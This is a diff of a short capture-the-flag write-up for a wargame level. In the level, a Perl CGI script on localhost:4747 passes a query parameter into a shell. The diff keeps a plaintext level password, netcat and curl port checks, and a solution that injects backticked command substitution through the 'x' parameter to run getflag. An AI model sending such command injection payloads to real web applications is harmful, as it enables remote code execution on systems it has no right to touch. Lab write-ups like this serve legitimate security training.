@@ -9,9 +9,6 @@ Login
 > Password: qi0maab88jeaj46qoumi7maus
 ```
 
-We have a PERL script, \
-and it seems to interact with a webpage:
-
 ```pl
 #!/usr/bin/perl
 # localhost:4747
@@ -38,18 +35,18 @@ x(param("x"));
   # x comes in form of "...?x=getflag"
 ```
 
-Solution
-- try to scan and connect to `localhost:4242`
-- set the query payload and Perl will echo it 
-
 ```b
+# test
+
 > curl -I localhost:4747
 or
 > nc -vz localhost 4747
       ^ v: verbose
         z: scan if a port is open (a listening daemon)
 Connection to localhost 4747 port [tcp/*] succeeded!
+```
 
+```b
 # solve
 
 curl localhost:4747?x="\`$(which getflag)\`"
